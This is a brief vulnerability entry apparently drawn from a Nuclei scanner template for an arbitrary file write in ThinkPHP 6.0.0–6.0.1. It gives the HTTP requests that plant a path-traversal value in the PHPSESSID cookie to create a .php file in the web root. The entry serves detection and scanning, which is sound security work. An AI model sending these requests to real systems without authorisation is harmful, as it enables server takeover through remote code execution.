# Vulnerability: ThinkPHP 6.0.0~6.0.1 - Arbitrary File Write
**Classification:** THINKPHP
**Source:** Nuclei Template (`thinkphp6-arbitrary-write.yaml`)

## Description
ThinkPHP 6.0.0~6.0.1 is susceptible to remote code execution. An attacker can upload any script file through this vulnerability to realize remote code execution takeover.We inject payload into PHPSESSID. In the buggy version, the payload is url encoded and returned as it is. In the fixed version, the payload is returned as a 32-bit hexadecimal string

## Vulnerable Code Pattern / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}
Cookie: PHPSESSID=/../../../public/{{random_filename}}.php
Content-Type: application/x-www-form-urlencoded

GET /{{random_filename}}.php HTTP/1.1
Host: {{Hostname}}
```

